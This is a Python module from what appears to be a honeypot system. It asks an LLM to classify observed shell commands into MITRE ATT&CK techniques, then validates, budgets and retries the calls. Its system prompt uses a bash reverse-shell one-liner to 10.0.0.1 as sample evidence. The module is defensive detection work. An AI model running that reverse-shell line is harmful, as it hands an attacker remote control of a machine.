"""LLM-based MITRE ATT&CK classifier for commands that slip past the regex tier.

Called only when map_command_to_mitre() returns [] — i.e. novel, obfuscated, or
chained commands the static rules don't cover. Results are written to mitre_cache
so the same command never costs a second call.
"""

import json
import logging
import re
import time
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from llm_provider import LLMProvider

logger = logging.getLogger("ai-engine.mitre_ai")

# Module-level constant keeps the leading bytes identical across calls,
# enabling DeepSeek prefix-caching.
_CLASSIFIER_SYSTEM_PROMPT = """You are a MITRE ATT&CK v15 classifier for Linux shell commands observed on a honeypot.

Given a single shell command, return a JSON array of the MITRE technique(s) it represents.

Rules:
- Use ONLY real MITRE ATT&CK IDs (format: T followed by 4 digits, optionally .NNN sub-technique).
- Each item MUST have: technique_id, technique_name, tactic, confidence (0.0–1.0), evidence (the command or fragment that triggered).
- Empty array [] if the command is benign/unknown or cannot be confidently mapped.
- Return ONLY the JSON array. No prose, no markdown, no code fences.

Example output:
[{"technique_id":"T1059.004","technique_name":"Command and Scripting Interpreter: Unix Shell","tactic":"Execution","confidence":0.92,"evidence":"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}]"""

_T_ID_RE = re.compile(r'^T\d{4}(\.\d{3})?$')
_FENCE_RE = re.compile(r'^```[a-zA-Z0-9_-]*\s*$')


def _strip_fences(text: str) -> str:
    lines = text.strip().splitlines()
    lines = [l for l in lines if not _FENCE_RE.match(l.strip())]
    return "\n".join(lines).strip()


def _validate(raw: list, command: str) -> list:
    """Keep only items that look like real MITRE entries; tag source=ai."""
    out = []
    for item in raw:
        if not isinstance(item, dict):
            continue
        tid = item.get("technique_id", "")
        if not _T_ID_RE.match(str(tid)):
            continue
        out.append({
            "technique_id": tid,
            "technique_name": item.get("technique_name", ""),
            "tactic": item.get("tactic", ""),
            "confidence": min(1.0, max(0.0, float(item.get("confidence", 0.7)))),
            "evidence": (item.get("evidence") or command)[:200],
            "source": "ai",
        })
    return out


def classify_with_llm(command: str, llm: "LLMProvider") -> list:
    """Return MITRE techniques for *command* using the LLM.

    Returns [] (never raises) so it is always safe to call on the hot path.
    Budget and rate-limit checks are delegated to the LLMProvider so this
    function doesn't need to know about IP-level gating.
    """
    if llm.client is None:
        return []

    if not llm.budget.can_call():
        logger.debug("mitre_ai: budget exhausted, skipping")
        return []

    user_msg = f"Command: {command}"

    backoff = [0.0, 1.0]
    timeouts = [5.0, 8.0]
    last_exc = None

    for attempt, (sleep_s, t_out) in enumerate(zip(backoff, timeouts)):
        if sleep_s:
            time.sleep(sleep_s)
        try:
            resp = llm.client.with_options(timeout=t_out).chat.completions.create(
                model=llm.model_name,
                messages=[
                    {"role": "system", "content": _CLASSIFIER_SYSTEM_PROMPT},
                    {"role": "user", "content": user_msg},
                ],
                temperature=0,
                max_tokens=150,
                extra_body={"thinking": {"type": "disabled"}},
            )
            # charge budget for uncached tokens
            try:
                usage = getattr(resp, "usage", None)
                if usage:
                    details = getattr(usage, "prompt_tokens_details", None)
                    cached = 0
                    if details is not None:
                        cached = getattr(details, "cached_tokens", 0) or 0
                    total_in = getattr(usage, "prompt_tokens", 0) or 0
                    total_out = getattr(usage, "completion_tokens", 0) or 0
                    llm.budget.record(max(0, total_in - cached), total_out)
            except Exception:
                pass

            raw_text = (resp.choices[0].message.content or "").strip()
            raw_text = _strip_fences(raw_text)
            parsed = json.loads(raw_text)
            if not isinstance(parsed, list):
                return []
            return _validate(parsed, command)
        except json.JSONDecodeError:
            logger.debug(f"mitre_ai: JSON parse error on attempt {attempt+1}")
            return []
        except Exception as e:
            last_exc = e
            logger.warning(f"mitre_ai: attempt {attempt+1} failed: {e}")

    logger.error(f"mitre_ai: all attempts failed: {last_exc}")
    return []
